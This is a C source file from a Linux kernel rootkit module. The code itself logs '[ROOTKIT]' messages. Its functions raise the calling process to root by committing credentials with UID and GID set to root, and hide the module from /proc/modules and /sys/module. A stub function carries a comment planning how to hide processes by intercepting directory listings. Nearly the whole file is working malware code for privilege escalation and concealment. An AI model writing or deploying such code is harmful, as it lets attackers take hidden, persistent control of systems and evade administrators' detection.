#include "inc/utils.h"

#include "inc/constants.h"
#include "inc/macro_utils.h"
#include <linux/cred.h>
#include <linux/export.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/printk.h>
#include <linux/types.h>

void give_root(const pid_t i32_pid, const int i32_sig)
{
    struct cred *p_creds = NULL; // Pointer to the current task credentials

    // Get the current task credentials
    p_creds = prepare_creds();

    IF_U (p_creds == NULL) {
        pr_err("[ROOTKIT] * Failed to get credentials\n");
        return;
    }

    __SET_UIDS(p_creds, ROOT_UID);
    __SET_GIDS(p_creds, ROOT_GID);

    commit_creds(p_creds);

    pr_info("[ROOTKIT] * Process is now root\n");
}

void hide_module(void)
{
    // Remove module from /proc/modules
    list_del(&THIS_MODULE->list);

    // Remove module from /sys/module/
    kobject_del(&THIS_MODULE->mkobj.kobj);

    pr_info("[ROOTKIT] Module was hidden from /proc/modules and /sys/module/\n");
}

int hide_process(const pid_t i32_pid, const int i32_sig)
{
    // TODO
    // Create a global list of hidden PIDs
    // Add the given PID to the list
    // When a call to getdent is made, check if the dir is /proc (hide the PID), or
    // or if the dir is /proc/PID or a child (return ENOENT for open, getdents, etc.)
    return 1;
}
